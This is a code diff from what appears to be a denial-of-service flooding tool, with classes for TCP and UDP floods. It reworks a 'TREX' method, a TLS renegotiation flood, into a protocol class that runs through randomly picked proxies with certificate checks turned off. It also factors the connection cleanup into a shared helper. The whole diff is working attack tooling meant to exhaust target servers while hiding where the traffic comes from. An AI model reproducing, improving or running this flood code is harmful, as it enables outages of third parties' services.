@@ -17,13 +17,11 @@ from urllib import parse
 
 import aiohttp
 import async_timeout
-# XXX: fix import
-# XXX: add openssl library as a dependency
-from OpenSSL.SSL import *
+from OpenSSL import SSL
 from yarl import URL
 
 from . import proxy_proto
-from .proto import DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType
+from .proto import DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType, TrexIO 
 from .proxies import NoProxySet, ProxySet
 from .targets import TargetStats
 from .vendor.referers import REFERERS
@@ -46,6 +44,12 @@ except AttributeError:
     pass
 ctx.verify_mode = CERT_NONE
 ctx.set_ciphers("DEFAULT")
+
+
+trex_ctx = SSL.Context(SSL.TLSv1_2_METHOD)
+# XXX: more ciphers, make sure RSAs are used
+trex_ctx.set_cipher_list(b"ECDHE-RSA-AES256-GCM-SHA384")
+trex_ctx.set_verify(SSL.VERIFY_NONE, None)
 
 
 class Methods:
@@ -309,27 +313,8 @@ class AsyncTcpFlood:
             )
             conn = self._loop.create_connection(
                 flood_proto, host=proxy.proxy_host, port=proxy.proxy_port)
-        transport = None
-        try:
-            async with async_timeout.timeout(self._settings.connect_timeout_seconds):
-                transport, _ = await conn
-            sock = transport.get_extra_info("socket")
-            if sock and hasattr(sock, "setsockopt"):
-                sock.setsockopt(SOL_SOCKET, SO_RCVBUF, self._settings.socket_rcvbuf)
-        except asyncio.CancelledError as e:
-            if on_connect:
-                on_connect.cancel()
-            on_close.cancel()
-            raise e
-        except Exception as e:
-            if on_connect:
-                on_connect.set_exception(e)
-            raise e
-        else:
-            return bool(await on_close)
-        finally:
-            if transport:
-                transport.close()
+
+        return await self._with_safe_close(conn, on_connect, on_close)
 
     async def GET(self, on_connect=None) -> bool:
         payload: bytes = self.build_request()
@@ -606,60 +591,58 @@ class AsyncTcpFlood:
         return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)
 
     async def TREX(self, on_connect=None) -> bool:
-        # XXX: what about proxies?
-        sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM, _socket.IPPROTO_TCP)
-        sock.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
-        sock.setblocking(False)
-        # XXX: timeout
-        await self._loop.sock_connect(sock, self._raw_target)
-        self._stats.track_open_connection()
+        on_close = self._loop.create_future()
 
-        # XXX: cache context object
-        ctx = Context(TLSv1_2_METHOD)
-        # XXX: more ciphers, make sure RSAs are used
-        ctx.set_cipher_list(b"ECDHE-RSA-AES256-GCM-SHA384")
-        ctx.set_verify(VERIFY_NONE, None)
-        # XXX: unfortunetly, pyOpenSLL does not have support from SSL_CTX_set_msg_callback()
-        #      but maybe we can use info callback to track incoming vs. outgoing traffic
-        # ctx.set_info_callback(lambda *args: print(args))
+        trex_proto = partial(
+            TrexIO,
+            trex_ctx,
+            self._settings.requests_per_connection,
+            self._stats,
+            self._loop,
+            on_connect,
+            on_close
+        )
+        proxy_url: str = self._proxies.pick_random()
+        if proxy_url is None:
+            addr, port = self._raw_target
+            conn = self._loop.create_connection(trex_proto, host=addr, port=port, ssl=None)
+        else:
+            proxy, proxy_protocol = proxy_proto.for_proxy(proxy_url)
+            on_socket = self._loop.create_future()
+            trex_proto = partial(
+                proxy_protocol,
+                self._loop,
+                on_close,
+                self._raw_target,
+                None,
+                downstream_factory=trex_proto,
+                connect_timeout=self._settings.dest_connect_timeout_seconds,
+                on_connect=self._loop.create_future() # as we don't want it to fire too early
+            )
+            conn = self._loop.create_connection(
+                trex_proto, host=proxy.proxy_host, port=proxy.proxy_port, ssl=ssl_ctx)
 
-        conn = Connection(ctx, sock)
-        conn.set_connect_state()
-        # XXX: i assume this is not required if we use VERIFY_NONE
-        # conn.set_tlsext_host_name(self._target.authority.encode())
+        return await self._with_safe_close(conn, on_connect, on_close)
 
-        on_done = self._loop.create_future()
-
-        # XXX: track budget
-        def _write(re=False, num=0):
-            if re:
-                # XXX: OpenSSL's API is quite weird, actually operation is going
-                #      to be performed only when next read/write is done
-                conn.renegotiate()
-            try:
-                conn.do_handshake()
-            except WantReadError:
-                self._loop.add_reader(sock, partial(_write, False, num))
-            except Exception as e:
-                # XXX: it seems like the connection is getting closed after ~150 blocks
-                # print(num, e)
-                self._loop.remove_reader(sock)
-                # XXX: EOF while reading is the only "Okaish" error here
-                #      otherwise we have to close sock explicitly from our side
-                self._stats.track_close_connection()
-                if not on_connect.done():
-                    on_connect.set_exception(e)
-                if not on_done.done():
-                    on_done.set_exception(e)
-            else:
-                self._loop.remove_reader(sock)
-                if num > 0 and not on_connect.done():
-                    on_connect.set_result(True)
-                self._stats.track(1, 1)
-                self._loop.call_soon(partial(_write, True, num+1))
-
-        self._loop.call_soon(partial(_write, False))
-        return await on_done
+    async def _with_safe_close(self, conn, on_connect, on_close) -> bool:
+        transport = None
+        try:
+            async with async_timeout.timeout(self._settings.connect_timeout_seconds):
+                transport, _ = await conn
+        except asyncio.CancelledError as e:
+            if on_connect:
+                on_connect.cancel()
+            on_close.cancel()
+            raise e
+        except Exception as e:
+            if on_connect:
+                on_connect.set_exception(e)
+            raise e
+        else:
+            return bool(await on_close)
+        finally:
+            if transport:
+                transport.close()
 
 
 class AsyncUdpFlood:
